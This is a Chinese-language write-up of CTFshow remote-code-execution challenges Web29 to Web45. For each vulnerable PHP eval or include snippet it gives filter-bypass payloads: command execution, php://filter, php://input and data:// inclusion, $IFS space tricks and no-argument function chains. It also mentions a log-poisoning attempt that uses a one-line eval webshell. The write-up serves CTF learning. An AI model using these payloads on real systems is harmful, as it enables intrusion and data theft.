# CTFshow RCE

**题目范围：Web29 - Web77 | Web118 - Web124**

参考：[命令执行的解题技巧](https://blog.csdn.net/qq_53058639/article/details/134156671)

参考：[无参数读文件和RCE总结](https://blog.csdn.net/qq_38154820/article/details/107171940)





## Web 29

代码如下：

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

首先先说一个注意点：`?c=system('ls');`一定不要少了后面的分号，eval内执行的是php代码，必须以分号结尾

有一个Linux命令：`tac`，也就是反向的cat，作用也是反向输出内容，但是不知道为什么，这个题里面使用cat显示不出任何内容，但是tac就可以。

绕过cat使用`tac more less head tac tail nl od(二进制查看) vi vim sort uniq`



**原因：**`?c=system("cat fla*.php");`页面不会直接显示flag，可以查看网页源代码获取flag，或者：`c=system("cat fla*.php|tac"); `  没什么意义就是了，

> **解释：**
>
> 1. `cat fla*.php`: 这部分命令使用`cat`命令来将以`fla`开头且以`.php`结尾的所有文件内容输出到标准输出（通常是显示在终端上）。
>
> 2. `|`: 这是一个管道符号，它将`cat`命令的输出作为`|`后面命令的输入。
>
> 3. `tac`: 这个命令是`cat`的逆序，它会将输入的文本逆序输出。
>

因为只过滤了“flag”。

所以我们可以：`?c=system("tac fla*.php"); `

或者：`?c=eval($_GET["code"]);&code=system("tac flag.php");`

或者：`c=system("cp fl*g.php a.txt");`然后访问/a.txt

或者：`?c=highlight_file(next(array_reverse(scandir(".")))); `

关于为什么要倒转数组，是因为当遍历目录的时候，数组的第一个是“.”，第二个是“..”，然后是隐藏文件（文件名称以.开头），最后才是我们要的文件，所以到倒转过来。也就是说，我们一直next再next再……也行，但是这就会很麻烦（不知道要试到第几个才行）

> **解释：**
>
> 这行代码是PHP中的一行代码，它有几个部分构成：
>
> 1. `scandir(".")`: 这个函数会列出当前目录中的所有文件和目录，并返回一个数组，数组的每个元素都是当前目录中的一个文件或目录名。
>
>    当你将 "." 作为参数传递给时，它将返回**当前目录中**的文件的名称列表。例如，如果当前目录中有文件 “file1.txt” 和 “file2.txt”，那么将返回数组 。`scandir()``scandir(".")["file1.txt", "file2.txt"]`
>
> 2. `array_reverse()`: 这个函数会将数组中的元素顺序颠倒，即反转数组。
>
> 3. `next()`: 这个函数返回数组中当前指针所在元素的下一个元素，并将数组指针移动到下一个位置。
>
> 4. `highlight_file()`: 这个函数会将指定文件的内容以HTML格式高亮显示，并输出到浏览器或标准输出。
>
> 因此，整个代码的作用是从当前目录中获取所有文件和目录名，然后将这个数组反转，并从反转后的数组中取出下一个文件名，然后将该文件的内容以HTML格式高亮显示输出。
>
> 
>
> 同时还有**show_source()函数**，该函数和highlight_file()函数功能差不多，被过滤时也可以替换为这个试试。

或者 利用参数输入+eval：`?c=eval($_GET[1]);&1=phpinfo();`

或者 利用参数输入+include：`?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php`

> **解释：**
>
> 它试图包含一个通过GET请求传递的参数。
>
> 1. `include $_GET[1]`: 这部分代码试图包含通过GET请求传递的参数所指定的文件。`$_GET[1]`是从GET请求中获取名为`1`的参数的值，然后`include`语句会尝试将这个值作为文件名包含进来。
>
> 2. `1=php://filter/read=convert.base64-encode/resource=flag.php`: 这部分是GET请求中的参数字符串。它的作用是使用PHP的过滤器（filters）功能，将`flag.php`文件的内容以Base64编码的形式读取并传递给`include`语句。具体来说：
>    - `php://filter/read=convert.base64-encode/resource=flag.php`部分是一个PHP过滤器，它将`flag.php`文件的内容读取，并对其进行Base64编码。
>    - `1=`这一部分是参数名，告诉PHP将此值赋给`$_GET[1]`。
>
> 总体来说，这行代码的目的是从服务器文件系统中读取`flag.php`文件的内容，并以Base64编码的形式输出到客户端。





## Web 30 system过滤

代码如下：

```php
<?php
error_reporting(0);

if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (!preg_match("/flag|system|php/i", $c)) {
        eval($c);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

其中过滤的flag和php仍然可以使用通配符 * 或 ?  模糊匹配绕过。至于system，可以使用`exec`，`shell_exec`，反引号【`$command`】，`passthru`绕过，注意exec和shell_exec需要输出命令执行结果，其中的exec，它的返回字符串只是外部程序执行后返回的最后一行；若需要完整的返回字符串，可以使用 PassThru() 这个函数。

**passthru：**

`?c=passthru("ls");`

` ?c=passthru("tac fla*");`

**反引号：**

```
?c=echo `ls`;
?c=echo `tac fla*`;
```

**shell_exec：**

`?c=echo shell_exec("ls");`

` ?c=echo shell_exec("nl fla*|tac");`

**eval绕过：**

` ?c=eval($_GET["code"]);&code=system("tac flag.php");`

`?c=eval($_GET[1]);&1=phpinfo();`

`?c=eval($_GET[1]);&1=system("tac%20flag.php");`

**注意：**拼接法`?c=$a=sys;$b=tem;$d=$a.$b;$d("tac fl*");`（这方法也是没谁了）

**一个linux命令：**

打印文件命令 echo nl  file，这个命令貌似可以在cat、tac被过滤的时候使用。

**PHP短标签：**`<?=system('ls')?>`





## Web 31

代码如下：

```php
<?php
error_reporting(0);

if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)) {
        eval($c);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

敏感词： "flag"、"system"、"php"、"cat"、"sort"、"shell"、"."、" "、"'"（空格和单引号）。

我们一个一个看：

1. flag，这个就用通配符就行
2. system，Web 30中已经解决了
3. cat，我们可以使用“tac、nl、cp”等
4. 空格，`%09`、`${IFS}`、`$IFS$9`（`\$IFS\$9`转义）都可以

**解题：**

最简单的：

`?c=passthru("ls");`

`?c=passthru("tac%09fla*");`

**还有：**

`?c=passthru(%22tac\$IFS\$9fla*%22); `也就是`passthru("tac\$IFS\$9fla*");`（%22为双引号）

**使用pos(localeconv)来获取小数点**

localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。这就绕过了小数点限制。

> current()函数返回数组中的当前元素/单元，默认取第一个值；
>
> pos()函数同上，是current()函数的别名；
>
> reset()函数，当数组不为空时返回数组第一个单元的值，如果数组为空则返回FALSE
>
> `print_r(scandir(current(localeconv())));`
> `print_r(scandir(pos(localeconv())));`
> `print_r(scandir(reset(localeconv())));`



 scandir可以结合它扫描当前目录内容。`?c=print_r(scandir(pos(localeconv())));` 可以看到当前目录，通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后

`?c=show_source(next(array_reverse(scandir(pos(localeconv())))));`

或者：`c=show_source(next(array_reverse(scandir(getcwd()))));`

这个在**Web 29**有详细解释，这里就是在Web 29的基础上绕过了小数点。

next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以

`?c=show_source(scandir(getcwd())[2]);`

**getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())**



**相关的方法：**

current()返回数组中的当前元素的值。

end()将内部指针指向数组中的最后一个元素，并输出。

next()将内部指针指向数组中的下一个元素，并输出。

prev()将内部指针指向数组中的上一个元素，并输出。

reset()将内部指针指向数组中的第一个元素，并输出。

each()返回当前元素的键名和键值，并将内部指针向前移动。

**还有一种方法：**

`?c=$f=glob("f*");show_source($f[0]);`





## Web 32

代码如下：

```php
<?php
error_reporting(0);
if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)) {
        eval($c);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

看了看WP，两种方法，**文件包含**、**日志注入**。



### 文件包含：

```php
?c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
?c=include%0A$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php

?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

其实两者的差距只在于一个%0a，改不改无所谓，下面解释各成分作用

- 首先是include+参数1，作用是包含参数1的文件，运用了文件包含漏洞，最后的文件名字可以改为/etc/passwd和nginx的日志文件来定位flag位置
- 然后是%0a作用，这是url回车符，因为空格被过滤。事实上，删去也无所谓，似乎php会自动给字符串和变量间添加空格（经检验，只在eval中有效，echo中无效，还是得要空格）
- 后面的?>的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?>前可以不写分号。
- 在c中引用了参数1，然后&后对参数1定义，运用文件包含漏洞
- php://filter/convert.base64-encode/resource=  是hackbar中LFI文件包含漏洞一个功能，用来包含并且返回，得到结果还要进行base64解码
- 有的时候参数是数字会被过滤，这时候换成字母就行了（Web 36）

**PS:前面的几道题也可以使用文件包含做，但是没有什么必要**



### 日志包含(失败)

但是假如我们并不知道flag在哪里呢？
我们通过响应头，发现是nginx，默认nginx日志文件在/var/log/nginx/access.log

结合这里的include，构造如下语句，也可以尝试先/etc/passwd，确认的确可以包含。

`?c=include%0a$_GET[a]?>&a=../../../../var/log/nginx/access.log`

访问该路径时，（这一步一直不成功）在User-Agent中写入一句话木马`<?php @eval($_POST[‘a’]);?>`，然后用中国蚁剑连接即可

或者修改User-Agent为我们要执行的语句，访问主页。 再去访问日志，就可以看到当前目录的文件列表了。





## Web 35

```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){ 
```

这里介绍两种方法：`php://input`和`Data伪协议`

### **php://input**

题目对常见命令都进行过滤，但是仔细发现可以利用include进行绕过，具体实现方式为 `eval(include flag.php;);`，但是题目屏蔽了分号(;)和点号(.),，其中分号可以使用?>平替，但是点号无法绕过，遂使用post执行php代码注入flag.php，因此可得payload:

GET：`?c=include$_GET[1]?>&1=php://input`

POST：`<?php system('tac flag.php');?>`

**注意**：因为POST没有按照key=value封装数据，因此hackBar认为数据有问题，不会发送数据，可以使用Burp Suite发送数据。**!!注意!! php://input别使用hakebar，用BurpSuite**

**补充:**    `php://input`默认读取没有处理过的POST数据



#### **Data伪协议：**

**Data伪协议用法：**

1. `data://text/plain,php代码`
2. `data://text/plain;base64,php代码`

`?c=include%0a$_GET[a]?>&a=data://text/plain,<?php system("tac fla*");?>`

这个不知道为什么也是在hakebar里面发送不出去，直接在浏览器地址栏里面弄就好了





## Web 37

代码如下：

```php
<?php
//flag in flag.php
error_reporting(0);
if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (!preg_match("/flag/i", $c)) {
        include($c);
        echo $flag;
    }
} else {
    highlight_file(__FILE__);
}
?>
```

include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。
伪协议中的`data://`，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行

```php
?c=data://text/plain,<?php system("cat f*")?>       //查看flag.php，右键源码中查找flag
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKT8+
                          //'base64,'后面是base64加密的<?php system('cat flag.php')?>
?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
                          //'base64,'后面是base64加密的<?php system("tac flag.php")?>
                          // Base64内容中，可以尝试在php后回车
```





## Web 39

代码如下：

```php
<?php
error_reporting(0);
if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (!preg_match("/flag/i", $c)) {
        include($c . ".php");
    }
} else {
    highlight_file(__FILE__);
}
?>
```

查看发现只过滤flag，但是LFI的时候会带上.php，这里先尝试一波执行data伪协议，尝试.php后缀是否会对伪协议的执行产生影响

`?c=data://text/plain,<?php system("tac fla*.php");?>`

执行发现成功，加上.php并不会对伪协议的执行有影响,因为<?php code ?> 已经闭合执行完了



### 双引号引发的问题：

这句话不能成功：`?c=data://text/plain,<?php system(“tac fla*.php”);?>`

但是上面那一句可以，这两个只有双引号不同，`""`  `“”` ，都是英文状态下的双引号，但就是不一样，其实前者是在url中输入的双引号，而后者就是在这里输入的。以后需要注意一下这个。





## Web 40

代码如下：

```php
<?php
if (isset($_GET['c'])) {
    $c = $_GET['c'];
    if (!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)) {
        eval($c);
    }
} else {
    highlight_file(__FILE__);
}
?>
```

注意看：被过滤的是中文状态下的括号，而非英文

题目考察php无参数函数构造，即可以为`a(b());a();`等但不能为`a('b');`等

**（Web 29）（Web 31）：**

`?c=print_r(scandir(current(localeconv())));`

`?c=show_source(next(array_reverse(scandir(pos(localeconv())))));`



**或者：（不懂的话 就看看下边的参考文章）**

`?c=eval(array_pop(next(get_defined_vars())));`

需要POST传入参数为1=system('tac fl*');

get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。

next()将内部指针指向数组中的下一个元素，并输出。

array_pop() 函数删除数组中的最后一个元素并返回其值。



### 题目的重点：**php无参数函数利用**

**参考：**[PHP无参数函数利用](https://blog.csdn.net/weixin_45785288/article/details/109259595)

无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,‘c’)，**不能带参数**





## Web 42

```php
<?php
if (isset($_GET['c'])) {
    $c = $_GET['c'];
    system($c . " >/dev/null 2>&1");
} else {
    highlight_file(__FILE__);
}
```

这行代码执行一个系统命令，该命令由变量 $c 的值指定。`>/dev/null 2>&1` 是一个 shell  重定向操作，意味着命令的标准输出（stdout）和标准错误（stderr）都被重定向到  /dev/null，即被丢弃，用户不会看到任何输出结果。

### 方法一：

 直接`/?c=cat flag.php`或者`cat flag.php%0a` 之后查看源代码

### 方法二：

使用 `";"、"||"、"&"、"&&" `分隔

>  ; //分号
>  | //只执行后面那条命令
>  || //只执行前面那条命令
>  & //两条命令都会执行
>  && //两条命令都会执行

可构造playload:
` ?c=tac flag.php||`
 `?c=tac flag.php%26`
 注意，这里的&需要url编码

`/dev/null 2>&1`是不进行回显，所以采用命令把flag打印出来，利用`;`分隔分化一下 构造payload：





## Web 43

命令执行，因为正则过滤了；分号，过滤了cat，所以使用了`?c=tac flag*%0a`

也可以：

```
?c=ls||
?c=tac flag.php||
```





## Web 44

`?c=tac fl*||`

也可以通过cp命令将flag.php的内容cp成txt格式的，`?c=cp fl* a.txt`，之后直接访问a.txt就可以直接看到flag。





## Web 45

过滤了空格

```
?c=echo$IFS`tac$IFS*`%0A
```

或者直接`%09`：`?c=tac%09fl*||`。
